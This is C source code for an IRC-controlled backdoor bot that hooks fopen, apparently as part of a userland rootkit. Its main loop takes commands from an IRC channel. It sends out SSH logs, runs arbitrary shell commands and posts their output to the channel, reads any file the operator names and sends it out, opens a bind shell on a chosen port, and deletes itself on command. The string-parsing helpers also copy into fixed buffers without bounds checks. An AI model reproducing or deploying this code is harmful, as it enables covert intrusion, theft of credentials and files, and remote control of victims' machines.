int read_line(int sock, char *buffer)
{
    size_t length = 0;
    while(1)
    {
        char data;
        int result=recv(sock,&data,1,0);
        if((result <= 0) || (data == EOF)) exit(1);
        buffer[length]=data;
        length++;

        if(length>=2 && buffer[length-2]=='\r' && buffer[length-1]=='\n')
        {
            buffer[length-2]='\0';
            return length;
        }
    }
}

char *get_prefix(char *line)
{
    char clone[512], *prefix=malloc(512);
    strncpy(clone, line, strlen(line) + 1);
    if(line[0]==':')
    {
        char *splitted=strtok(clone," ");
        if(splitted != NULL) strncpy(prefix, splitted+1, strlen(splitted)+1);
        else prefix[0]='\0';
    }else prefix[0]='\0';
    return prefix;
}

char *get_username(char *line)
{
    char clone[512], *username=malloc(512);
    strncpy(clone, line, strlen(line) + 1);

    if(strchr(clone, '!') != NULL) {
        char *splitted=strtok(clone, "!");
        if(splitted != NULL) strncpy(username, splitted+1, strlen(splitted)+1);
        else username[0]='\0';
    }else username[0]='\0';
    return username;
}

char *get_command(char line[])
{
    char clone[512], *command=malloc(512), *splitted;
    strncpy(clone, line, strlen(line)+1);
    splitted = strtok(clone, " ");

    if(splitted != NULL){
        if(splitted[0] == ':') splitted=strtok(NULL, " ");
        if(splitted != NULL) strncpy(command, splitted, strlen(splitted)+1);
        else command[0]='\0';
    }else command[0]='\0';
    return command;
}

char *get_last_argument(char line[])
{
    char clone[512], *argument=malloc(512), *splitted;
    strncpy(clone, line, strlen(line)+1);
    splitted=strstr(clone, " :");
    if(splitted != NULL) strncpy(argument, splitted+2, strlen(splitted)+1);
    else argument[0]='\0';
    return argument;
}

char *get_argument(char line[], int argno)
{
    char clone[512], *argument = malloc(512), *splitted;
    int current_arg = 0;
    strncpy(clone, line, strlen(line)+1);
    splitted = strtok(clone, " ");
    while(splitted != NULL)
    {
        if(splitted[0]!=':') current_arg++;
        if(current_arg==argno)
        {
            strncpy(argument, splitted, strlen(splitted)+1);
            return argument;
        }
        splitted=strtok(NULL, " ");
    }
    if(current_arg!=argno) argument[0]= '\0';
    return argument;
}

void set_nick(int sock, char nick[])
{
    char nick_packet[512];
    sprintf(nick_packet, "NICK %s\r\n", nick);
    (void) send(sock, nick_packet, strlen(nick_packet), 0);
}

void send_user_packet(int sock, char nick[])
{
    char user_packet[512];
    sprintf(user_packet, "USER %s 0 * %s\r\n", nick, nick);
    (void) send(sock, user_packet, strlen(user_packet), 0);
}

void join_channel(int sock, char channel[])
{
    char join_packet[512];
    sprintf(join_packet, "JOIN %s\r\n", channel);
    (void) send(sock, join_packet, strlen(join_packet), 0);
}

void send_pong(int sock, char argument[])
{
    char pong_packet[512];
    sprintf(pong_packet, "PONG :%s\r\n", argument);
    (void) send(sock, pong_packet, strlen(pong_packet), 0);
}

void send_message(int sock, char to[], char message[])
{
    char message_packet[512];
    sprintf(message_packet, "PRIVMSG %s :%s\r\n", to, message);
    (void) send(sock, message_packet, strlen(message_packet), 0);
}

int setup_connection(void)
{
    int s;
    struct addrinfo hints,*res;
    memset(&hints,0,sizeof(hints));
    hints.ai_family=AF_UNSPEC;
    hints.ai_socktype=SOCK_STREAM;
    hints.ai_flags=AI_PASSIVE;

    int rc=getaddrinfo(HOST,PORT,&hints,&res);
    if(rc<0) exit(0);
    s=socket(res->ai_family,res->ai_socktype,res->ai_protocol);
    if(s<0) goto fail;
    if(connect(s,res->ai_addr,res->ai_addrlen)<0) goto fail;
    freeaddrinfo(res);

    set_nick(s, NICK);
    send_user_packet(s, NICK);
    return s;
fail:
    freeaddrinfo(res);
    exit(0);
}

void populate_chrs(char *line, char **pfix, char **uname, char **cmd, char **larg)
{
    *pfix=get_prefix(line);
    *uname=get_username(line);
    *cmd=get_command(line);
    *larg=get_last_argument(line);
    return;
}

void betrayer(int s)
{
    FILE *fp;
    char line[512],fbuf[128],*ucmd;
    HOOK(o_fopen,"fopen");
    while(1)
    {
        (void) read_line(s,line);
        populate_chrs(line,&prefix,&username,&command,&largument);

        if(!strcmp(command,"PING"))
        {
            send_pong(s,largument);

            /* some services require that you have ponged a ping before joining channels.
               some don't. but those that don't may also kick us for trying to join a channel
               too fast.
               so until we've ponged a ping, we don't really do anything but wait about on a ping. */
            if(!have_ponged)
            { join_channel(s, CHANNEL); have_ponged=1; }
        }

        /* once we know that we more or less have a solid connection, we can start doing stuff. */
        if(have_ponged)
        {
            ucmd = get_argument(line,3);
            /* it is mandatory that these operations have another argument to go along
             * with them. */
            if(ucmd[0] != '\0')
            {
                /* reads outgoing ssh logfile and sends to channel */
                if(!strncmp(largument,"!ssh_logs",strlen("!ssh_logs")) && !strcmp(NICK,ucmd))
                {
                    fp=o_fopen(SSH_LOGS,"r");
                    if(!fp) continue;
                    while(fgets(fbuf,sizeof(fbuf),fp) != NULL)
                    {
                        CMSG(fbuf);
                        (void) sleep(SEND_TOUT);
                    }
                    (void) fclose(fp);
                }

                /* allows you to execute commands from the channel.
                 * sends the output of said command(s) to the channel so you
                 * can see what's going on. */
                if(!strncmp(largument,"!sh",strlen("!sh")) && !strcmp(NICK,ucmd))
                {
                    char *shcmd=strdup(largument),cmd[128];
                    shcmd += 4 + strlen(NICK) + 1;
                    snprintf(cmd,sizeof(cmd),"%s 2>/dev/null",shcmd); /* we don't want errors popping up randomly. */
                    fp=popen(shcmd,"r");                              /* that would be weird... */
                    if(!fp) continue;
                    while(fgets(fbuf,sizeof(fbuf),fp) != NULL) CMSG(fbuf);
                    (void) pclose(fp);
                }

                if(!strncmp(largument,"!read_file",strlen("!read_file")) && !strcmp(NICK,ucmd))
                {
                    char *file=get_argument(line,4);
                    fp=o_fopen(file,"r");
                    if(!fp) continue;
                    while(fgets(fbuf,sizeof(fbuf),fp) != NULL)
                    {
                        CMSG(fbuf);
                        (void) sleep(SEND_TOUT);
                    }
                    (void) fclose(fp);
                    CMSG("finished reading file.");
                }

                if(!strncmp(largument,"!bind",strlen("!bind")) && !strcmp(NICK,ucmd))
                {
                    int port=atoi(get_argument(line,4));
                    if(!port) continue;
                    if(create_bind_shell(port)<0) { CMSG("failed to create bind shell."); }
                    else{
                        char nmsg[64];
                        snprintf(nmsg,sizeof(nmsg),"bind shell created. listening for connections on port %d",port);
                        CMSG(nmsg);
                    }
                }

                if(!strncmp(largument,"!kill",strlen("!kill")) && (!strcmp(NICK,ucmd) || !strcmp("all",ucmd)))
                {
                    if(kill_self()<0)
                    {
                        CMSG("something went wrong killing myself.");
                        continue;
                    }
                }
            }
        }
    }
}
